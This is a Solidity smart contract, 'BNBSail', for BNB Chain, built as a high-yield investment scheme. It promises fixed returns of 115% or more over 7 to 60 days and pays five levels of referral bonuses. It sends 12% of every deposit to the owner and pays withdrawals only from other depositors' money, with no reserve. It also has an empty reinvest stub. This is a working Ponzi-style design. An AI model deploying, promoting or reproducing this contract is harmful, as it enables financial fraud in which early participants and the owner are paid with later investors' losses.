
//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Sailor {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract BNBSail {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5]; 

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Sailor) public sailors;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    modifier restricted() {
    require(
      msg.sender == owner,
      "Restricted to the contract owner"
    );
    _;
  }

    constructor() {
        owner = msg.sender;

        uint256 tarifPercent = 115;
        for (uint8 tarifDuration = 7; tarifDuration <= 60; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 4;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            sailors[_addr].last_payout = uint40(block.timestamp);
            sailors[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = sailors[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            sailors[up].match_bonus += bonus;
            sailors[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = sailors[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(sailors[_addr].upline == address(0) && _addr != owner) {
            if(sailors[_upline].deposits.length == 0) {
                _upline = owner;
            }

            sailors[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                sailors[_upline].structure[i]++;

                _upline = sailors[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.1 ether, "Minimum deposit amount is 0.1 BNB");

        Sailor storage sailor = sailors[msg.sender];

        _setUpline(msg.sender, _upline, msg.value);

        sailor.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        sailor.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(owner).transfer(msg.value * 12  / 100);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Sailor storage sailor = sailors[msg.sender];

        _payout(msg.sender);

        require(sailor.dividends > 0 || sailor.match_bonus > 0, "Zero amount");

        uint256 amount = sailor.dividends + sailor.match_bonus;

        sailor.dividends = 0;
        sailor.match_bonus = 0;
        sailor.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Sailor storage sailor = sailors[_addr];

        for(uint256 i = 0; i < sailor.deposits.length; i++) {
            Deposit storage dep = sailor.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = sailor.last_payout > dep.time ? sailor.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Sailor storage sailor = sailors[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = sailor.structure[i];
        }

        return (
            payout + sailor.dividends + sailor.match_bonus,
            sailor.total_invested,
            sailor.total_withdrawn,
            sailor.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}